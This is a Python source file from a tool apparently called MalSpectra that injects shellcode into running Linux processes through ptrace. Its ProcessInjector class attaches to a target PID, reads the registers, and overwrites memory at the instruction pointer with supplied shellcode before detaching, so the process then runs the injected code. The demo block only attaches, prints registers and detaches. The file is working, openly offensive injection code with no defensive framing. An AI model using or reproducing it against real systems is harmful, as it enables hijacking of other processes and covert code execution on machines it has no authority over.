"""
MalSpectra - Process Injector
Linux process injection using ptrace

Developer: Sai Srujan Murthy
Email: saisrujanmurthy@gmail.com
"""

import os
import ctypes
import ctypes.util
from typing import Optional


# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# ptrace constants
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_PEEKTEXT = 1
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7


# Define user_regs_struct for x86_64
class UserRegsStruct(ctypes.Structure):
    """x86-64 register structure."""
    _fields_ = [
        ('r15', ctypes.c_ulonglong),
        ('r14', ctypes.c_ulonglong),
        ('r13', ctypes.c_ulonglong),
        ('r12', ctypes.c_ulonglong),
        ('rbp', ctypes.c_ulonglong),
        ('rbx', ctypes.c_ulonglong),
        ('r11', ctypes.c_ulonglong),
        ('r10', ctypes.c_ulonglong),
        ('r9', ctypes.c_ulonglong),
        ('r8', ctypes.c_ulonglong),
        ('rax', ctypes.c_ulonglong),
        ('rcx', ctypes.c_ulonglong),
        ('rdx', ctypes.c_ulonglong),
        ('rsi', ctypes.c_ulonglong),
        ('rdi', ctypes.c_ulonglong),
        ('orig_rax', ctypes.c_ulonglong),
        ('rip', ctypes.c_ulonglong),
        ('cs', ctypes.c_ulonglong),
        ('eflags', ctypes.c_ulonglong),
        ('rsp', ctypes.c_ulonglong),
        ('ss', ctypes.c_ulonglong),
        ('fs_base', ctypes.c_ulonglong),
        ('gs_base', ctypes.c_ulonglong),
        ('ds', ctypes.c_ulonglong),
        ('es', ctypes.c_ulonglong),
        ('fs', ctypes.c_ulonglong),
        ('gs', ctypes.c_ulonglong),
    ]


class ProcessInjector:
    """
    Injects shellcode into running process using ptrace.
    """
    
    def __init__(self):
        """Initialize injector."""
        self.attached_pid = None
    
    def check_root(self) -> bool:
        """
        Check if running as root.
        
        Returns:
            True if root, False otherwise
        """
        return os.geteuid() == 0
    
    def check_process_exists(self, pid: int) -> bool:
        """
        Check if process exists.
        
        Args:
            pid: Process ID
            
        Returns:
            True if exists, False otherwise
        """
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False
    
    def attach(self, pid: int) -> bool:
        """
        Attach to process using ptrace.
        
        Args:
            pid: Process ID to attach to
            
        Returns:
            True if successful, False otherwise
        """
        if not self.check_process_exists(pid):
            return False
        
        result = libc.ptrace(PTRACE_ATTACH, pid, None, None)
        
        if result == -1:
            return False
        
        # Wait for process to stop
        os.waitpid(pid, 0)
        
        self.attached_pid = pid
        return True
    
    def detach(self) -> bool:
        """
        Detach from process.
        
        Returns:
            True if successful, False otherwise
        """
        if self.attached_pid is None:
            return False
        
        result = libc.ptrace(PTRACE_DETACH, self.attached_pid, None, None)
        self.attached_pid = None
        
        return result != -1
    
    def get_registers(self) -> Optional[UserRegsStruct]:
        """
        Get process registers.
        
        Returns:
            UserRegsStruct or None
        """
        if self.attached_pid is None:
            return None
        
        regs = UserRegsStruct()
        result = libc.ptrace(
            PTRACE_GETREGS,
            self.attached_pid,
            None,
            ctypes.byref(regs)
        )
        
        if result == -1:
            return None
        
        return regs
    
    def set_registers(self, regs: UserRegsStruct) -> bool:
        """
        Set process registers.
        
        Args:
            regs: UserRegsStruct to set
            
        Returns:
            True if successful, False otherwise
        """
        if self.attached_pid is None:
            return False
        
        result = libc.ptrace(
            PTRACE_SETREGS,
            self.attached_pid,
            None,
            ctypes.byref(regs)
        )
        
        return result != -1
    
    def write_memory(self, address: int, data: bytes) -> bool:
        """
        Write data to process memory.
        
        Args:
            address: Memory address
            data: Bytes to write
            
        Returns:
            True if successful, False otherwise
        """
        if self.attached_pid is None:
            return False
        
        # ptrace writes in word (8 bytes) chunks on x86-64
        word_size = 8
        
        # Pad data to word boundary
        if len(data) % word_size != 0:
            padding = word_size - (len(data) % word_size)
            data = data + (b'\x00' * padding)
        
        # Write data word by word
        for i in range(0, len(data), word_size):
            word = int.from_bytes(data[i:i+word_size], 'little')
            
            result = libc.ptrace(
                PTRACE_POKETEXT,
                self.attached_pid,
                address + i,
                word
            )
            
            if result == -1:
                return False
        
        return True
    
    def inject_shellcode(self, pid: int, shellcode: bytes) -> bool:
        """
        Inject shellcode into process.
        
        Args:
            pid: Process ID
            shellcode: Shellcode bytes to inject
            
        Returns:
            True if successful, False otherwise
        """
        # Attach to process
        if not self.attach(pid):
            return False
        
        try:
            # Get current registers
            regs = self.get_registers()
            if regs is None:
                self.detach()
                return False
            
            # Save original RIP
            original_rip = regs.rip
            
            # Write shellcode at RIP location
            if not self.write_memory(original_rip, shellcode):
                self.detach()
                return False
            
            # Detach and let process continue
            return self.detach()
        
        except Exception as e:
            # Ensure we detach on error
            if self.attached_pid is not None:
                self.detach()
            raise e


if __name__ == "__main__":
    # Test injector
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python injector.py <pid>")
        sys.exit(1)
    
    try:
        pid = int(sys.argv[1])
        
        injector = ProcessInjector()
        
        if not injector.check_root():
            print("Error: Root privileges required")
            sys.exit(1)
        
        print(f"Attaching to process {pid}...")
        
        if injector.attach(pid):
            print("Attached successfully")
            
            regs = injector.get_registers()
            if regs:
                print(f"RIP: 0x{regs.rip:016x}")
                print(f"RSP: 0x{regs.rsp:016x}")
            
            injector.detach()
            print("Detached")
        else:
            print("Failed to attach")
    
    except ValueError:
        print("Error: Invalid PID")
        sys.exit(1)
    
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
